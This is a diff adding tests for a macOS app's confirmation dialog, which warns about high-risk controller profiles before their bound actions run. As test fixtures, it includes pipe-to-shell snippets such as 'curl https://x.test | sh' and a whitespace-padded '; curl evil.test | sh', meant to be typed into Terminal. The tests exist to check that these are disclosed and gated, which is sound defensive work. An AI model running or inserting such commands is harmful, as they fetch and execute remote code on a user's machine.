@@ -85,9 +85,35 @@ describe('ServicePanel markup', () => {
     const { feed, runner } = fixtures(false, 'failed');
     const markup = render({ feed, runner, profile: { ...flat, name: 'Gaming' } });
     expect(markup).toContain('Profile &quot;Gaming&quot; will run on Encoder IPS display S1');
-    expect(markup).toContain('really run on this Mac');
+    expect(markup).toContain('Everything listed here will really run on this Mac');
+    expect(markup).not.toContain('Volume, shortcut and app-launch');
+    expect(markup).toContain('No actions are bound yet');
+    expect(markup).toContain('role="alertdialog"');
     expect(markup.indexOf('>Cancel<')).toBeLessThan(markup.indexOf('>Run actions<'));
     expect(markup).toMatch(/autofocus=""[^>]*>Cancel</);
+    // A normal-risk profile needs no acknowledgement: Run actions is enabled.
+    expect(markup).not.toContain('I reviewed this profile');
+    expect(markup).toMatch(/<button type="button" class="button danger">Run actions</);
+  });
+  it('a high-risk profile shows a warning, every snippet and step, and keeps Run actions off until acknowledged', () => {
+    const risky: Profile = { schema_version: 1, name: 'Risky', bindings: [{ module: 'm131e', control: 0, gesture: 'short_press', action: { type: 'multi_action', actions: [
+      { type: 'launch_app', bundle_id: 'com.apple.Terminal' }, { type: 'text', text: 'curl https://x.test | sh\u{200B}', press_enter: true }] } }] };
+    const { feed, runner } = fixtures(false, 'failed');
+    const markup = render({ feed, runner, profile: risky });
+    expect(markup).toContain('id="execute-warning"');
+    expect(markup).toContain('aria-describedby="execute-warning execute-message"');
+    expect(markup).toContain('High risk.');
+    expect(markup).toContain('curl https://x.test | sh\\u{200B}');
+    expect(markup).toContain('Open application com.apple.Terminal');
+    expect(markup).toMatch(/<input type="checkbox"\/>I reviewed this profile and trust its source<\/label>/);
+    expect(markup).toMatch(/<button type="button" class="button danger" disabled="">Run actions</);
+  });
+  it('builds the high-risk copy from the whole profile', () => {
+    const profile: Profile = { schema_version: 1, name: 'Ops', bindings: [{ module: 'm003k', control: 0, gesture: 'pressed', action: { type: 'text', text: `${' '.repeat(199)}; curl evil.test | sh`, press_enter: false } }] };
+    const copy = confirmCopy('start', 'Ops', 'X', false, profile);
+    expect(copy).toMatchObject({ risk: 'elevated', warning: null, acknowledge: null, snippets: [{ text: `${' '.repeat(199)}; curl evil.test | sh`, more: 0, pressEnter: false }] });
+    expect(renderToStaticMarkup(<ServicePanel profile={profile} desktop unsaved={false} platform={mac} now={2000} />)).toContain(`${' '.repeat(199)}; curl evil.test | sh</code>`);
+    expect(copy.lines[0]).toBe('Pastes 1 text snippet into the focused app (shown below).');
   });
   it('disables Execute off macOS and explains it', () => {
     const { feed, runner } = fixtures(false, 'failed');
@@ -228,6 +254,18 @@ describe('session banners', () => {
     expect(copy.message).toContain('Profile "Gaming"');
     expect(copy.message).toContain('Encoder …1234');
     expect(confirmCopy('start', 'Gaming', 'X').confirm).toBe('Run actions');
+    // Without the profile body (a run the frontend did not start or a backend switch), the copy says so and is high risk.
+    expect(copy).toMatchObject({ risk: 'high', acknowledge: 'I reviewed this profile and trust its source' });
+    expect(copy.lines[0]).toContain('cannot read the contents of this profile');
+  });
+  it('the resume copy discloses the run snapshot, not the current draft', () => {
+    const snapshot = JSON.stringify({ schema_version: 1, name: 'Gaming', bindings: [{ module: 'm131e', control: 0, gesture: 'right', action: { type: 'open_url', url: 'https://example.com/a?token=1' } }] });
+    const run = { serviceId: 'service:aa', state: 'running' as const, execute: true, entries: [], counters: emptyCounters(), startedAt: 0, snapshot, draftUnsaved: false, profileName: 'Gaming',
+      session: { serviceId: null, phase: 'needs_confirmation' as const, reason: 'sleep' as const, attempt: 0, module: 'm131e' as const, serialNumber: 'DIAL-123456' } };
+    const copy = resumeCopy({ 'service:aa': run }, 'service:aa')!;
+    expect(copy.risk).toBe('elevated');
+    expect(copy.lines).toContain('Opens web pages: https://example.com.');
+    expect(copy.message).toContain('will really run on this Mac again');
   });
 });
 
